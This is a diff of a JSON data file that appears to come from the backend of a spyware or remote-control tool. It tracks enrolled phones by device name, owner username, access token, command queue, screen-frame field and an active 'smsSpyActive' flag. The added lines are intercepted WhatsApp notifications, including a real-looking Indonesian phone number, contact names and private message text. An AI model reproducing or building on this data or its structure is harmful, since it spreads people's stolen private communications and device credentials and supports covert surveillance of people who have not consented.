@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776922871791,
+    "lastSeen": 1776922874791,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -14068,7 +14068,7 @@
     "deviceName": "HP-RIXX09-D692",
     "ownerUsername": "RIXX09",
     "token": "e6d4d8ffcbd89fb3479c078f0f21f4e6",
-    "lastSeen": 1776922870225,
+    "lastSeen": 1776922876216,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-23T05:33:03.881Z",
@@ -14084,6 +14084,78 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Teman Mahakam🥶",
+        "content": "‎168 pesan baru",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922876685
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎169 pesan dari 2 chat",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922874212
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 857-0906-2175",
+        "content": "📷 ‎11 foto",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922874195
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Teman Mahakam🥶 (168 pesan): ~ akmal",
+        "content": "om matikan chat dulu yaa hp om ngelag 🙏😭",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922873976
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 857-0906-2175",
+        "content": "📷 ‎11 foto",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922873266
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎169 pesan dari 2 chat",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922873245
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Teman Mahakam🥶 (168 pesan): ~ akmal",
+        "content": "om matikan chat dulu yaa hp om ngelag 🙏😭",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922873215
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎169 pesan dari 2 chat",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922872875
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 857-0906-2175",
+        "content": "📷 ‎11 foto",
+        "time": "23/04 13:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922872855
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Teman Mahakam🥶 (168 pesan): ~ akmal",
